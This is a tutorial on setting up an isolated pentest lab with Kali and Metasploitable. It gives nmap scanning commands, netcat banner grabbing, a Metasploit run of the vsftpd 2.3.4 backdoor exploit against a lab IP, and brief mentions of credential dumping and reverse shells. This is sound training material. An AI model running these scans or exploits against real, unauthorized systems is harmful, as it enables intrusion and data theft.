# 🛡️ A detailed guide to setting up a safe and practical penetration testing lab.

## 1️⃣ Lab Requirements

### Hardware
- Minimum 8–16 GB RAM, 4+ cores CPU
- 100+ GB free disk space
- Virtualization support (VT-x/AMD-V)

### Software
- **Host OS:** Windows 10/11 or Linux
- **Virtualization:** VMware Workstation, VirtualBox, or Hyper-V
- **Guest OS (Target Machines):**
  - Kali Linux (Attacker) – preinstalled with tools
  - Metasploitable 2 / 3 (Vulnerable Linux) – target
  - Windows 10 / Windows Server (for AD testing)
  - DVWA (Damn Vulnerable Web App) – for web testing

### Network Setup
- Use an **isolated virtual network** (NAT/Host-only) to avoid affecting your real network.
- Assign static IPs:
  - Kali: `192.168.56.128`
  - Metasploitable 2: `192.168.56.130`
  - Windows: `192.168.56.132`


## 2️⃣ Lab Setup

### Step 1: Install Virtualization
1. Install **VMware Workstation** or **VirtualBox**.
2. Enable **Virtualization** in BIOS.
3. Create a **Host-Only Network** (isolated from Internet).

### Step 2: Setup Attacker Machine
- Install **Kali Linux VM**.
- Update & upgrade packages:
```bash
sudo apt update && sudo apt upgrade -y
````

* Install extra tools:

```bash
sudo apt install -y nmap netcat metasploit-framework wireshark john hydra nikto
```

### Step 3: Setup Target Machines

* **Metasploitable 2:**

  * Import VM.
  * Assign static IP.
  * Default credentials: `msfadmin:msfadmin`.
* **Windows VM (Optional):**

  * Enable **Remote Desktop**.
  * Join domain if testing Active Directory attacks.

---

## 3️⃣ Network Reconnaissance

### Step 1: Ping Sweep

```bash
nmap -sn 192.168.56.0/24
```

### Step 2: Port Scanning

```bash
nmap -p- 192.168.56.130
```

Service & version detection:

```bash
nmap -sV -p 21,22,23,80,445 192.168.56.130
```

### Step 3: OS Detection

```bash
nmap -O 192.168.56.130
```

---

## 4️⃣ Vulnerability Enumeration

### Step 1: Banner Grabbing

* Using **Netcat**:

```bash
nc 192.168.56.130 21
```

* Using **Nmap scripts**:

```bash
nmap -sV --script=banner 192.168.56.130
```

### Step 2: Vulnerability Scanning

* Nmap NSE Scripts:

```bash
nmap --script vuln 192.168.56.130
```

* Using **OpenVAS / Nessus**:

  * Scan target VM for CVEs and vulnerabilities.

---

## 5️⃣ Exploitation

### Step 1: Using Metasploit

```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.56.130
run
```

### Step 2: Manual Exploits

* Exploit misconfigured services manually (e.g., default credentials on FTP, SMB).

---

## 6️⃣ Post-Exploitation

### Step 1: Privilege Escalation

* Check kernel version, installed packages.
* Use tools like **LinPEAS**, **WinPEAS**.

### Step 2: Collect Sensitive Data

* Dump passwords, configs, and user files for lab purposes.

### Step 3: Maintain Access

* Simulate reverse shells for testing.

---

## 7️⃣ Web Application Testing (Optional)

* Use **DVWA** or **OWASP Juice Shop**.
* Test for:

  * SQL Injection
  * XSS (Cross-Site Scripting)
  * File Upload Vulnerabilities
  * Command Injection

---

## 8️⃣ Reporting

* Document:

  * Recon results
  * Exploits used
  * Screenshots
  * Mitigation recommendations
* Create a **professional pentest report**.

---

## 9️⃣ Safety Tips

* Keep lab isolated from the Internet.
* Never scan or attack external networks without permission.
* Snapshot VMs before testing.

---

💡 **Tip:** Practice different attack vectors: network, web, and OS. Adding **Active Directory** lab allows testing of password attacks, group policies, and Kerberos vulnerabilities.

```

